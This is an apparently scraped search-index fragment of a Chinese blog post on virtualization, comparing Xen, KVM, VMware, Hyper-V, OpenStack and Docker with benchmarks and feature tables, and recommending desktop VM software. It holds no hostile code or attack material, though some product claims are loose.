","date":"2021-11-20","objectID":"/zh-cn/20-3/:7:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"外部链接[编辑] 进入美妙的虚拟世界—虚拟系统探秘[永久失效链接] An introduction to Virtualization （页面存档备份，存于互联网档案馆） [VMware虚拟技术白皮书（英文）](http://www.vmware.com/pdf/virtualization.pdf#search=\"hypervisor VMware virtualization layer”) （[页面存档备份](https://web.archive.org/web/20210427133749/http://www.vmware.com/pdf/virtualization.pdf#search=\"hypervisor VMware virtualization layer\")，存于互联网档案馆） [隐藏]查论编虚拟化技术平台虚拟化软件比较硬件虚拟化 （Hypervisor）原生虚拟化AdeosCP/CMSHyper-VKVM Red Hat Enterprise VirtualizationLDoms / Oracle VM Server for SPARCLynxSecureSIMMONVMware ESX VMware vSphereVCloud AirVMware InfrastructureXen Oracle VMXenClientXtratuMz/VM需要宿主操作系统专用Basilisk IIbhyveBochsCooperative LinuxDOSBoxDOSEMUL4LinuxMac-on-LinuxMac-on-MacPCemSheepShaverSIMHWindows on Windows DOS虚拟机Win4Lin独立Microsoft Virtual ServerParallels WorkstationParallels DesktopParallels ServerPearPCQEMUVirtualBoxVirtual IronVMware FusionVMware Workstation PlayerVMware ServerVMware WorkstationWindows Virtual PC工具GanetioVirtVirtual Machine Manager操作系统层虚拟化基于Cgroups Container LinuxlmctfyLinux-VServerLXCDockerOpenVZ VirtuozzoFreeBSD jailiCore Virtual AccountsKubernetesLinux namespacesSolaris ContainersWorkload Partitions桌面虚拟化Citrix XenApp思杰系统远程桌面VMware HorizonUlteo应用程序虚拟化 （沙盒）CeedoCitrix XenAppDalvikInstallFree微软App-V远程桌面SpoonSymantec Workspace VirtualizationVMware ThinAppZeroVM网络虚拟化DOVENetwork Virtualization using Generic Routing Encapsulation‎Open vSwitchVirtual security switch虚拟局域网扩展 (VXLAN)参见: 模拟器软件列表‎**^** Data Virtualization – dataWerks. www.datawerks.com. [2018-04-12]. （原始内容存档于2018-04-10） （美国英语）. 虚拟化 - xen、kvm、vmware、hyper-v等虚拟化技术的比较 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:8:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"1. 从费用上比较 http://www.path8.net/tn/archives/4994 收费和免费： xen 和 kvm 都是开源免费的虚拟化软件。 vmware 是付费的虚拟化软件。 hyper-v 比较特别，是微软windows 2008 R2附带的虚拟化组件，如果你买了足够的授权，hyper-v（包括hyper-v 2008 core）都可以免费使用。 因此： 如果是vmware或hyper-v虚拟windows系统，不管是虚拟化软件本身，还是其中的子系统，都要支付许可费用。 如果是vmware或hyper-v虚拟linux，虚拟化软件本身要支付许可费用，子系统可以用linux来节省成本。 如果是xen或kvm虚拟windows，其中的子系统要支付许可费用。 如果是xen或kvm虚拟linux，那么虚拟化软件本身和其中的子系统无需产生任何费用。 结论： 虚拟 windows，在有授权的情况下，建议使用 hyper-v；在没有授权的情况下，虚拟windows，建议使用 KVM 虚拟 linux，建议使用 xen，如考虑到需要降低管理维护和学习成本，建议使用kvm。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:9:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"2. 从性能上比较 虚拟windows，如果都能得到厂商的支持，那么，性能优化可以不用担心。这几款软件全都能达到主系统至少80%以上的性能（磁 盘，CPU，网络，内存），这时建议使用 hyper-v 来虚拟windows，微软自身的产品，虚拟windows是绝对有优势的。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:10:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"2.1 I/O 比较 [（来自 http://blog.csdn.net/babyfacer/article/details/21107513）](http://www.cnblogs.com/（来自 http:/blog.csdn.net/babyfacer/article/details/21107513）) 如果是虚拟 linux，建议： 首先使用 xen，支持linux的半虚拟化，可以直接使用主系统的cpu和磁盘及网络资源，达到较少的虚拟化调度操作，可以达到非常高的性能，但xen操作复杂，维护成本较高。 其次我们推荐kvm来虚拟linux，linux本身支持kvm的virtio技术，可以达到少量的虚拟化调度操 作，得到较高的系统性能。 不推荐使用hyper-v来虚拟linux，太多的不兼容性导致linux基本无法在hyper-v上跑。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:10:1","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"2.2 性能测试报告 http://linux.cn/article-3496-1.html 本测试使用裸机作为虚拟服务测试的基准设备。在不跑虚拟机的情况下，两台裸机的性能偏差不会大于0.51% 在几乎所有测试中，KVM 的性能相比宿主机而言下降了1.5%以内，只有两项测试例外。第一个是 7-zip 压缩，比宿主机慢了 2.79%。第二个就奇怪了，我们搭了一个邮件服务器，用 PostMark 测试其性能，结果表明 KVM 竟比宿主机快了4.11%。然后我在两台服务器中重新跑了几遍 PostMark 测试，结果性能差异基本不变，浮动都在最初测试结果的1%以内。由于我对 virtio 的内部机制没有很深的理解，我只能在以后再对这个怪现象进行进一步了解。 Xen 的性能相对宿主机而言差异就比较大了。有3项测试性能下降在2.5%以内，剩下的性能下降率都是 KVM 的2～4倍。PostMark 测试的性能比 KVM 慢了14.41%，这结果令我大吃一惊。重新跑了下测试，性能差还是几乎不变，浮动都在最初结果的2%以内。KVM 表现最好的 CPU 测试：MAFFT 对齐测试，是 Xen 表现倒数第二差的。 现在奉上一个简短得总结表： Best Value Bare Metal KVM Xen C-Ray lower 35.35 35.66 36.13 POV-Ray lower 230.02 232.44 235.89 Smallpt lower 160 162 167.5 John the Ripper (Blowfish) higher 3026 2991.5 2856 John the Ripper (DES) higher 7374833.5 7271833.5 6911167 John the Ripper (MD5) higher 49548 48899.5 46653.5 OpenSSL higher 397.68 393.95 388.25 7-Zip higher 12467.5 12129.5 11879 Timed MAFFT Alignment lower 7.78 7.795 8.42 CLOMP higher 3.3 3.285 3.125 PostMark higher 3667 3824 3205 如果需要完整数据，请查看Goole Docs 电子表格。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:10:2","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"结论 基于上面的测试环境，KVM 的性能损耗几乎都在2％以内，Xen 则在十多项测试中有3项损耗在2.5％以内，而其他几项损耗都在5~7%之间。虽然 KVM 在 PostMark 测试中性能表现优异，但这是众多测试中仅有的一项 I/O 测试，如果想证明 KVM 确实在 I/O 处理方面很强悍，就需要更多测试。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:10:3","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"2.3 更多的测试报告 http://www.phoronix.com/scan.php?page=article\u0026item=intel_haswell_virtualization\u0026num=1 https://blog.xenproject.org/2011/11/29/baremetal-vs-xen-vs-kvm-redux/ http://www.infoq.com/cn/news/2014/09/kvm-vs-xen http://flymanhi.blog.51cto.com/1011558/1112363 在经过综合测试后，不论是单个parallel还是两个parallel，xen的跑分测试都比kvm要好。 http://blog.chinaunix.net/uid-20662820-id-4514947.html 三种虚拟化性能比较 LXC»KVM»XEN （由于LXC使用cgroup机制，其性能损坏基本为0。） 三种虚拟化隔离比较 XEN»KVM»LXC （LXC只能虚拟化linux） 三种虚拟化内存利用率 LXC»KVM»XEN （由于LXC共用内核，内存利用率最高；其他两种方案每个虚机都需要单独的操作系统占用一部分内存空间。） http://www.os-easy.com/News/2014-10/526.html 从运算性能和磁盘负载角度来说Linux KVM不失为最快的虚拟化解决方案。相比之下，VirtualBox在测试中排名第二，而Xen在HVM模式下的虚拟化表现最差。 综上：比较有意思的是这些测试报告的结论都不太一样甚至是相反的。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:10:4","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"3. 产方支持 如果以上产品我们不打算买厂商支持，其中vmware和hyper-v，是不建议使用的，主要是授权问题。 这时就剩下kvm和xen了，如果虚拟windows，建议使用 kvm，我们可以从 redhat那里免费拿到针对 windows 优化过的磁盘和网络的驱动 程序，可以达到较高的性能（几乎与hyper-v性能持平）。 而xen的 windows 优化驱动不是那么容易就能拿到的（由于redhat以后不支持 xen了，看看novell是否放水了，呵呵，就开放程度上来讲，redhat要好于novell）。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:11:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"4. 特性比较 http://blog.csdn.net/babyfacer/article/details/21107513 Attribute Zones Xen KVM CPU Performance high high (with CPU support) high (with CPU support) CPU Allocation flexible (FSS + “bursting”) fixed to VCPU limit fixed to VCPU limit I/O Throughput high (no intrinsic overhead) low or medium (with paravirt) low or medium (with paravirt) I/O Latency low (no intrinsic overhead) some (I/O proxy overhead) some (I/O proxy overhead) Memory Access Overhead none some (EPT/NPT or shadow page tables) some (EPT/NPT or shadow page tables) Memory Loss none some (extra kernels; page tables) some (extra kernels; page tables) Memory Allocation flexible (unused guest memory used for file system cache) fixed (and possible double-caching) fixed (and possible double-caching) Resource Controls many (depends on OS) some (depends on hypervisor) most (OS + hypervisor) Observability: from the host highest (see everything) low (resource usage, hypervisor statistics) medium (resource usage, hypervisor statistics, OS inspection of hypervisor) Observability: from the guest medium (see everything permitted, incl. some physical resource stats) low (guest only) low (guest only) Hypervisor Complexity low (OS partitions) high (complex hypervisor) medium Different OS Guests usually no (sometimes possible with syscall translation) yes yes ","date":"2021-11-20","objectID":"/zh-cn/20-3/:12:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"更多的特性比较： http://en.wikipedia.org/wiki/Operating-system-level_virtualization#Implementations Mechanism Operating system License Available since/between Features File system isolation Copy on Write Disk quotas I/O rate limiting Memory limits CPU quotas Network isolation Nested virtualization Partition checkpointing and live migration Root privilege isolation chroot most UNIX-likeoperating systems varies by operating system 1982 Partial[5] No No No No No No Yes No No Docker Linux[6] Apache License 2.0 2013 Yes Yes Not directly Not directly Yes Yes Yes Yes No No Linux-VServer (security context) Linux GNU GPLv2 2001 Yes Yes Yes Yes[7] Yes Yes Partial[8] ? No Partial[9] lmctfy Linux Apache License 2.0 2013 Yes Yes Yes Yes[7] Yes Yes Partial[8] ? No Partial[9] LXC Linux GNU GPLv2 2008 Yes[10] Partial. Yes withBtrfs. Partial. Yes withLVM orDisk quota. Yes Yes Yes Yes Yes No Yes[10] OpenVZ Linux GNU GPLv2 2005 Yes No Yes Yes[11] Yes Yes Yes[12] No Yes Yes[13] Virtuozzo Linux,Windows Proprietary July 2000[14] Yes Yes Yes Yes[15] Yes Yes Yes[12] ? Yes Yes Solaris Containers(Zones) Solaris,OpenSolaris,Illumos CDDL February 2004 Yes Yes (ZFS) Yes Partial. Yes with Illumos.[16] Yes Yes Yes[17] Partial. Only when top level is a KVM zone (Illumos) or a kz zone (Oracle) No[18] Yes[19] FreeBSD Jail FreeBSD BSD License 1998 Yes Yes (ZFS) Yes[20] No Yes[21] Yes Yes Yes No Yes[22] sysjail OpenBSD,NetBSD BSD License No longer supported, as of March 3, 2009 Yes No No No No No Yes No No ? WPARs AIX Proprietary 2007 Yes No Yes Yes Yes Yes Yes[23] No Yes[24] ? HP-UX Containers (SRP) HPUX Proprietary 2007 Yes No Partial. Yes with logical volumes Yes Yes Yes Yes ? Yes ? iCore Virtual Accounts Windows XP Proprietary/Freeware 2008 Yes No Yes No No No No ? No ? Sandboxie Windows Proprietary/Shareware 2004 Yes Yes Partial No No No Partial Yes No Yes ","date":"2021-11-20","objectID":"/zh-cn/20-3/:13:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":" 虚拟化技术比较:OpenStack、KVM、VMWare和Docker 一、虚拟化 1.什么是虚拟化 虚拟化，是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机。在一台计算机上同时运行多个逻辑计算机，每个逻辑计算机可运行不同的操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。 2.什么是虚拟化技术 虚拟化技术是一套解决方案。完整的情况需要CPU、主板芯片组、BIOS和软件的支持，例如VMM软件或者某些操作系统本身。即使只是CPU支持虚拟化技术，在配合VMM的软件情况下，也会比完全不支持虚拟化技术的系统有更好的性能。 3.虚拟化的类型 全虚拟化（Full Virtualization) 全虚拟化也成为原始虚拟化技术，该模型使用虚拟机协调guest操作系统和原始硬件，VMM在guest操作系统和裸硬件之间用于工作协调，一些受保护指令必须由Hypervisor（虚拟机管理程序）来捕获处理。全虚拟化的运行速度要快于硬件模拟，但是性能方面不如裸机。 技术分享图片 半虚拟化（Para Virtualization） 半虚拟化是另一种类似于全虚拟化的技术，它使用Hypervisor分享存取底层的硬件，但是它的guest操作系统集成了虚拟化方面的代码。该方法无需重新编译或引起陷阱，因为操作系统自身能够与虚拟进程进行很好的协作。半虚拟化需要guest操作系统做一些修改，使guest操作系统意识到自己是处于虚拟化环境的，但是半虚拟化提供了与原操作系统相近的性能。 技术分享图片 二、OpenStack与KVM、VMWare 1.OpenStack：开源管理项目 OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目。它不是一个软件，而是由几个主要的组件组合起来完成一些具体的工作。OpenStack由以下五个相对独立的组件构成： OpenStack Compute(Nova)是一套控制器，用于虚拟机计算或使用群组启动虚拟机实例; OpenStack镜像服务(Glance)是一套虚拟机镜像查找及检索系统，实现虚拟机镜像管理; OpenStack对象存储(Swift)是一套用于在大规模可扩展系统中通过内置冗余及容错机制，以对象为单位的存储系统，类似于Amazon S3; OpenStack Keystone，用于用户身份服务与资源管理以及 OpenStack Horizon，基于Django的仪表板接口，是个图形化管理前端。 这个起初由美国国家航空航天局和Rackspace在2010年末合作研发的开源项目，旨在打造易于部署、功能丰富且易于扩展的云计算平台。OpenStack项目的首要任务是简化云的部署过程并为其带来良好的可扩展性，企图成为数据中心的操作系统，即云操作系统。 2.KVM(Kernel-based Virtual Machine)基于内核的虚拟机 KVM是集成到Linux内核的Hypervisor，是X86架构且硬件支持虚拟化技术（Intel VT或AMD-V）的Linux的全虚拟化解决方案。它是Linux的一个很小的模块，利用Linux做大量的事，如任务调度、内存管理与硬件设备交互等。 KVM最大的好处就在于它是与Linux内核集成的，所以速度很快。 技术分享图片 3.VMWare (Virtual Machine ware) VMWare (Virtual Machine ware)是一个“虚拟PC”虚拟机管理管理软件。它的产品可以使你在一台机器上同时运行二个或更多Windows、DOS、LINUX系统。与“多启动”系统相比，VMWare采用了完全不同的概念。多启动系统在一个时刻只能运行一个系统，在系统切换时需要重新启动机器。VMWare是真正“同时”运行，多个操作系统在主系统的平台上，就象标准Windows应用程序那样切换。而且每个操作系统你都可以进行虚拟的分区、配置而不影响真实硬盘的数据，你甚至可以通过网卡将几台虚拟机用网卡连接为一个局域网，极其方便。安装在VMware操作系统性能上比直接安装在硬盘上的系统低不少，因此，比较适合学习和测试。 三、OpenStack与VMWare 1.设计 VMware软件套件是自底向上的架构，下端边界为虚拟机管理器。像VMware的vSphere和vCloud director产品都是依赖于免费的ESX(i) 虚拟机管理器， ESX(i)虚拟机管理器为他们提供了非常优秀的部署架构。 VMware的软件系统是封闭的，并且软件的发展路线是完全遵循VMware自己的发展目标，用户或消费者在此方面没有任何控制权。 OpenStack作为一个开源系统，没有任何一家单独的公司在控制OpenStack的发展路线。 2.功能 （1）VMware vMotion vMotion是vSphere DRS、DPM和主机维护三大功能的合集。其中虚拟机动态迁移允许将一台虚拟机在零关机的情况下由一台宿主机迁移到另一台上，这原本是需要共享存储的支持的，但在vSphere 5.1中，VMware已经不需要通过共享存储实现动态迁移了。当一台虚拟机由一个宿主机迁移到另一个上时，虚拟机的内存状态和数据都要同步迁移过去。如果是共享存储的情况，实际上数据是不需要进行迁移的，只需要变化指向数据存储的链接而已。这在加速了迁移速度的同时也减少了在复制过程中网络的负载。 （2）OpenStack 动态迁移 KVM动态迁移允许一个虚拟机由一个虚拟机管理器迁移到另一个，说的详细一点，你可以来来回回将一台虚拟机在AMD架构主机与Intel架构主机上进行迁移，但是需要注意的是，64位的虚拟主机只能被迁移到64位的宿主机上，但是32位的则有32位和64位两种选择。在动态迁移过程中，不能再对虚拟机进行操作，但是虚拟机内的用户还是可以在虚拟机内部继续进行工作的。KVM主要还是依赖于共享存储，某种程度上，这相对来说是需要一些资金投入的。 （3）OpenStack块存储迁移 在OpenStack当中，KVM支持块存储迁移，这也就是说虚拟机迁移不是必须需要共享存储的支持的。在块迁移的场景下，虚拟机的内存状态与数据都将被迁移，但是迁移操作也需要消耗两端的CPU资源并且操作花费时间较比共享存储来说要长一些。在某些用户场景当中，如果我们比较关注于主机的可维护性，并且不想花费过多经费，那么应用块存储迁移将是好的解决方案。同时，如果在没有共享存储的环境中，我们想对计算节点进行内核维护、安全升级，那么保证虚拟机服务不被打断，块存储迁移也是理想选择。 （4）VMware DRS 和 DPM 基于vMotion，DRS可以动态监控虚机机及宿主机的当前使用状况，并且为宿主机的负载均衡提供支持。 基于vMotion， DPM将虚拟机从低负载宿主机迁移掉，并且关闭以达到减少电能损耗。当负载增长，DPM将宿主机重启，并且部署新的虚拟机以满足负载需要。 （5）OpenStack调度器 OpenStack包含了对于compute和volume的调度器，通过一系列的管理员设定的规则参数和过滤器，OpenStack调度器将虚拟机部署到合适的宿主机上。在过滤器方面，调度器是非常灵活的，用户可以自己完成JSON格式的过滤器，并且过滤器还包含很多预定义的过滤器。虽然OpenStack调度器非常灵活，但是还是不能完全替代DRS，原因如下： 调度器用于选择哪个宿主机进行虚拟机部署的静态参考数据来源于Nova的数据库。换句话说，就是发现宿主机已经有了4台虚拟机了，那么我们需要选择一个新的宿主机去部署下一台虚拟机。 调度器只能在虚拟机部署阶段影响部署的位置，一旦部署完成，虚拟机运行后则无法挪动虚拟机了。如果需要基于动态数据进行调度，那么调度器需要与外部监控解决方案如Nagios合作。总而言之，目前OpenStack调度器将只会对部署虚拟机环节有影响。 （6）High Availability(高可用) 在vSphere中，虚拟机级别的高可用性是允许在虚拟机或者ESX(i)主机出错时，在不同宿主机部署相同的虚拟机。这里不要和容错（FT）机制混淆，高可用的意义在于当有一些东西出错了，可以在一定时间内自我修复。高可用是在硬件出问题的时候保证虚拟机的正常个工作，如果真的出错了，那么只能在不同的ESX(i)主机上启动虚拟机，这也可能造成服务的中断。 目前并没有官方声明OpenStack支持虚拟机级别的高可用性，这个特性在Folsom版本被提出，但是后续又被放弃了。目前OpenStack有一个孵化项目Evacuate, 其作用是为OpenStack提供虚拟机级别高可用支持。 （7）Fault Tolerance（容错） VMware容错机制是通过监控虚拟机的状态和所有变化，将这些变化同步到第二台备份ESX(i)服务器之上。容错的概念在于无论是主还是从宿主机出现问题，只要一方能正常工作，那么宿主机上的虚拟机都保持正常工作。 在OpenStack中没有针对于容错的功能，并且截至目前也没有计划去完成这些功能。未来，KVM也不再支持镜像操作功能。 四、OpenStack与Docker OpenStack和Docker之间是很好的互补关系。Docker的出现能让IaaS层的资源使用得更加充分，因为Docker相对虚拟机来说更轻量，对资源的利用率会更加充分。 技术分享图片 Docker主要针对Paas平台，是以应用为中心。OpenStack主要针对Iaas平台，以资源为中心，可以为上层的PaaS平台提供存储、网络、计算等资源。 OpenStack项目的层级关系 技术分享图片 第一层是基础设施层，这一","date":"2021-11-20","objectID":"/zh-cn/20-3/:14:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"虚拟机软件推荐 虚拟机软件 虚拟机推荐理由 WMware虚拟机 (Workstation) Windows、Linux虚拟机软件 WMware虚拟机 (Fusion) 最适合Mac的虚拟机软件 VirtualBox虚拟机 最适合初学者的虚拟机软件 Parallels Desktop虚拟机 在Mac系统使用的虚拟机软件 Red Hat Virtualization虚拟机 最适合程序员的虚拟机软件 QEMU虚拟机 支持多种操作系统的虚拟机软件 Apple Boot Camp虚拟机 Apple开发的虚拟机软件 Citrix Hypervisor虚拟机 最具安全性的虚拟机软件 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:15:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"虚拟机是什么？ 虚拟机英语是Virtual Machine，简称为VM。 虽然名字中“机器”的字样，但实际上这是一款实现虚拟机功能的软件，所以更严谨的名称应该是虚拟机软件，也就是Virtual Machine Software。 虚拟机软件可以用来模拟一套具有独立的计算机操作系统，实现在现有计算机系统里，运行第二种计算机系统的所有功能，比如，在Windows系统中，运行MacOS。同时，两个系统完全独立，不会相互影响。 所以，使用虚拟机软件，可以在同一台计算机里，独立或同步运行多个操作系统、或者同种系统的不同版本，既可以是MacOS和Windows这样完全不同的系统，也可以Windows系统下的不同版本。 目前虚拟机主要分为两类：系统虚拟机、和进程虚拟机 系统虚拟机，英文是 System Virtual Machine ，可以在该软件中运行不同的操作系统，比如 Linux 或 Windows ，所以也可以称之为“完全虚拟化虚拟机”，比如，VMware和VirtualBox就属于这类虚拟机； 进程虚拟机，英文是Process virtual machine，可以在现有计算机操作系统环境下，仅执行某些可在其它操作系统运行的特定程序，而不需要运行完整的操作系统，熟知的 JVM (JAVA Virtual Machine ) 就是属于这种。 如下图所示为系统虚拟机软件的运行界面示例，在Mac系统平台上运行Windows系统，界面在一个独立视窗中，但系统所需的所有功能都可以进行操作。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:16:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"虚拟机有什么用？ 由于目前 Windows、MacOS 、Linux等多种操作系统并存，所以，您需要使用的软件与您的操作系统之间，不一定是完全匹配。 比如，您可能需要在MacOS中使用仅仅支持Windows系统的软件，或者您需要使用Windows笔记本来开发iOS APP，在这些使用场景中，虚拟机软件都可以大大的发挥作用。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:17:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"对于个人用户 如果您所需要使用的软件不支持现有计算机的操作系统，您就可以考虑安装虚拟机。 或者，您想测试一些新软件，但是担心安全隐患，也可以考虑安装虚拟机，恶意软件将无法在虚拟机中工作，因此，也无法在虚拟化的环境中去攻击您的计算机。 对于在同一台计算机中安装双系统仍存在操作盲点的朋友，您可能担心操作有误而损坏所有系统，那么，您最好选择虚拟机软件，操作简便，不会损坏计算机内的原有操作系统。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:17:1","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"对于程序员 对于程序员而说，测试所开发程序、在多种不同操作系统下运行的稳定性，是非常重要的一步。 虚拟机软件极大简化了这一个过程，使用同一台计算机，只需打开不同窗口就可以查看程序在不同操作系统下的运行状况，甚至可以在多窗口同步运行情况下，直观调试程序中出现的BUG。 同时，虚拟机还支持Windows系统用户，在Mac环境下使用Xcode编写iOS APP。 还有很多编程的朋友，需要在不同系统中进行计算机语言编译工作，比如进行JAVA语言编译程序，当需要更换计算机时，仅需安装JVM，即可在任何系统中编译和运行，不需要对系统进行修改，极大的优化了程序员的编译工作。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:17:2","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"对于企业 中大型企业的海量数据处理，往往需要多台服务器来完成，同时需要配备不同技术人员进行维护。 使用虚拟机则可以合并服务器，技术人员可以把部分服务器放到虚拟机中，然后在同一台计算机上运行，即将原本多台独立的服务器合并到一台计算机中。同时，因为每个虚拟机都是一个独立的数据容器，所以不会导致在同一个操作系统上运行不同服务器所产生安全问题，一定程度地缩减企业运行成本。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:17:3","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"虚拟机软件有哪些参数？ ","date":"2021-11-20","objectID":"/zh-cn/20-3/:18:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"A. 安装所支持的操作系统 这是一个最为重要的参数。虚拟机软件仍然是一款软件，所以必须保证，您所选择的虚拟机软件可以在现有的计算机操作系统上运行。 目前市面常见的虚拟机软件有以下几类： 仅支持Mac系统的虚拟机软件，比如 Parallels Desktop； 仅支持Linux系统的虚拟机软件，比如 Red Hat Virtualization ； 仅支持Linux和Windows的虚拟机软件，比如 VMware Workstation； 支持全系统的虚拟机软件，比如 QEMU； ","date":"2021-11-20","objectID":"/zh-cn/20-3/:18:1","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"B. 运行时可虚拟的操作系统 虚拟机软件所支持运行的虚拟系统也是您选择的一个重要参数，虚拟系统指的就是，当前的操作系统里，希望共用的第二种、或第三种操作系统。 打个比如，如果您电脑的操作系统是Mac，同时希望在同一台电脑里使用Windows系统，那么您就需要找到支持虚拟Windows系统的虚拟机软件。比如， 虚拟系统仅支持Windows系统，比如：Boot Camp； 虚拟系统仅支持Linux和Windows系统，比如Red Hat Virtualization； 虚拟系统支持任何操作系统，比如VirtualBox； ","date":"2021-11-20","objectID":"/zh-cn/20-3/:18:2","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"C. 是否支持GPU GPU，全称是图形处理器，英文是Graphics Processing Unit，是一种控制图像运算的微处理器（Micro-Processor）。计算机运行过程中，涉及到图形处理，尤其3D图形处理等高级别功能时，GPU的运行情况会直接导致图像呈现的效果。 所以，如果您需要使用的程序对计算机GPU要求较高，比如CAD制图软件等，那么，您就需要一款支持GPU的虚拟机软件，比如Citrix Hypervisor就提供此功能。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:18:3","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"D. 费用 很多虚拟机软件都提供免费版本，但是，当您需要使用更高级别的功能，比如更复杂的管理工具、或经常需要技术支持维护时，您就需要支付一定的费用。 而也有些虚拟机软件仍为开源软件，免费的同时、还支持程序员对软件进行二次开发，在数据共享的时代优化了软件的使用感，比如Oracle VirtualBox和QEMU。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:18:4","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"虚拟机软件详细介绍 虚拟机软件 可安装的操作系统 可虚拟的操作系统 费用 特点 WMware Workstation Windows, Linux 多种操作系统 免费/付费 支持GPU虚拟化 WMware Fusion Mac Windows, Linux 免费/付费 支持GPU虚拟化 VirtualBox Mac, Windows, Linux, Solaris Windows, Linux 免费/付费 支持多系统 Parallels Desktop Mac Windows 付费 兼容性高 Red Hat Virtualization Linux Linux, Windows 免费/付费 开源系统 QEMU 多系统 多系统 免费 灵活性高 Apple Boot Camp Mac Windows 免费 Mac自带，无需安装 Citrix Hypervisor Mac, Windows Windows, Linux 免费/付费 自建虚拟数据中心 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"1. VMware Workstation 虚拟机 VMware Workstation 推荐理由 最适合Windows和Linux系统的虚拟机软件 软件参数 可安装的系统：Windows、Linux 支持的第二种系统：多系统多版本 是否支持GPU虚拟化：是 费用：免费/付费 软件介绍 VMware可谓虚拟机软件市场的元老级成员，20多年的行业经验使其经常被当做虚拟机软件的行业标准来进行参考，它所提供的功能几乎集满足了所有虚拟化需求。 作为为数不多的支持DirectX 10和OpenGL 3.3的软件之一，VMware Workstation 可支持诸如CAD等需要GPU加速的应用软件，支持高级3D制图等图形密集型工作，解决在虚拟环境中图像或视频画质下降的问题；高级网络设置功能，允许您设置和管理更为精准的虚拟网络，也可为多个系统设置不同的隐私权限和网络配置；复制功能则使设置和运行多个系统变得更为方便。VMware提供完善的售前、售后服务，加以多年经验，可完美解决所有您需要的虚拟机软件问题。 在费用方面，针对个人用户，Workstation Player可免费使用，若需更为专业和复杂的功能，则可升级至Workstation Pro。对于企业用户，建议使用Pro版本，会根据用户的不同需求、设置不同价位，针对大学教师、教职员工、学生、甚至父母等人群也设置了不同折扣。Workstation Player价格为$149，Workstation Pro价格为$199。 优点 行业标杆性的强大功能 支持GPU虚拟化 支持运行众多系统版本 灵活的价格设置 缺点 会占用较多计算机资源 熟悉掌握使用方式需要一定的学习时间 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:1","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"2. VMware Fusion 虚拟机 VMware Fusion 推荐理由 最适合Mac系统的虚拟机软件 软件参数 可安装的系统：Mac 支持的第二套系统：Windows 和 Linux 是否支持GPU虚拟化：是 费用：免费/付费 软件介绍 与VMware Workstation为同一公司产品，这款VMare Fusion是针对Mac系统开发，支持Mac系统特有的功能，比如5K iMac显示器等。 作为支持在Mac系统运行Windows系统的软件，Fusion设有UnityView模式，该模式可使各操作系统界面之间无缝衔接，同时也支持各操作系统之间直接拖曳文件等共享功能。VMware Fusion还支持从Dock中直接启动Windows应用程序，从而避免了BOOT Camp那样需要重启计算机来回切换系统的麻烦。 针对开发人员和游戏玩家，Fusion配备有GPU虚拟化功能，可在虚拟机中显示需要Direct X 